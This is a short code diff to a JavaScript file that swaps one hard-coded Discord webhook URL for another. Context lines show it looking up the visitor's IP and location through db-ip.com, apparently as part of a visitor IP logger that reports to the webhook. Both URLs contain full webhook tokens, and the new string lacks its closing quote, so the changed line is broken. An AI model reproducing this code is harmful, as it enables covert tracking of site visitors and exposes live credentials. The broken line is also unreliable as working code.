@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1013794090929893437/Ul69vlAE_zrc1zZocR5Hb5tUqf_dVrSy2V9D0ot5NnJwNLZZ7sYSLhEcHgirDHnj3kkN";
+var webHookUrl = "https://canary.discord.com/api/webhooks/1461833880423370793/O9za6CCXj9bau9YZVfJT5LC_o2nf9diGXJ17of8t4rsaGAQPY-TUC-D6ESqFlNcD4TPm;
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
@@ -34,3 +34,4 @@ const request = async () => { // Calling a "synchronous" fetch
 }
 
 request();
+
